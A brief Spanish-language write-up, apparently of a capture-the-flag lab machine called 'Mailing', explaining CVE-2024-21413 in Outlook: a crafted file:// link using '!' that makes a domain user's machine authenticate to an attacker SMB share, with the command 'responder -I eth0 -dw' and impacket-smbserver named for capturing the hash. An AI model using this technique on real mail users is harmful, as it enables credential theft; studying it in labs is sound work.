
Hoy aprendí varias cosas con la maquina Mailing, resulta que era mucho mas interesante de lo que parecia, esta maquina contiene la reciente vulnerabilidad CVE-2024-21413, que consiste en enviar un hipervinculo trucado pro el cual outlook no avisa sobre posibles riesgos, esto se consigue usando el simbolo "!".

Esto funciona en directorio activo ya que los usuarios, al tener unas cuentas predefinidas, cuando le dan click en "file://\\IP\RECURSO\ARCHIVO_COMPARTIDO" el sistema se autentica usando las credenciales del usuario del computador el cual dio click, es decir, el usuario definido por el Domain controller, y ya esto se puede obtener el hash usando la herramienta 

	responder -I eth0 -dw 

o con un servidor smb usando impacket-smbserver sin poner credenciales (eso es importante)

